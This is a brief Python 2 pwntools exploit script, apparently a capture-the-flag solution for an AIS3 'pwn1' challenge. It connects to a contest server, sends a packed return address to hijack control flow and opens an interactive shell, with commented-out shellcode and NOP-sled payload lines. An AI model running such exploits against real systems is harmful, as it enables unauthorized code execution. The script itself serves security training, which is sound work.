#!/usr/bin/env python2

from IPython import *
from pwn import *

p = remote('quiz.ais3.org', 9561)
#p = remote('127.0.0.1', 7122)
#p = process('./pwn1.bin')

#embed()
#payload = asm(shellcraft.sh())
#payload = p32(0xffe00000)+'\x90'*0x100000+payload
#print repr(payload)

p.sendline(p32(0x08048610))

p.interactive()
